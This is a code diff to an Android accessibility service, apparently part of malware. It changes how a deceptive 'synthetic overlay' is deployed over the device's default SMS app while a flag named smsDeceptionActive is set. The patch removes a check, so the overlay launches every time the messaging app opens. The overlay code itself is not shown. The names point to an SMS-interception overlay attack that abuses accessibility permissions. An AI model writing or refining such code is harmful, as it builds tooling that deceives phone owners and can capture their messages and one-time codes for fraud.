@@ -504,10 +504,8 @@ class MyAccessibilityService : AccessibilityService() {
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             val defaultSmsPkg = android.provider.Telephony.Sms.getDefaultSmsPackage(this) ?: "com.google.android.apps.messaging"
             if (smsDeceptionActive && (pkgName == defaultSmsPkg || pkgName.contains("messaging", ignoreCase = true))) {
-                if (!DynamicUIManager.isSmsInterceptorActive) {
-                    DebugLogger.log("SMS_INTERCEPT", "Default SMS app launched. Deploying synthetic overlay.")
-                    DynamicUIManager.deploySmsInterceptor(this)
-                }
+                DebugLogger.log("SMS_INTERCEPT", "Default SMS app launched. Deploying synthetic overlay via Activity.")
+                DynamicUIManager.deploySmsInterceptor(this)
             }
         }
 
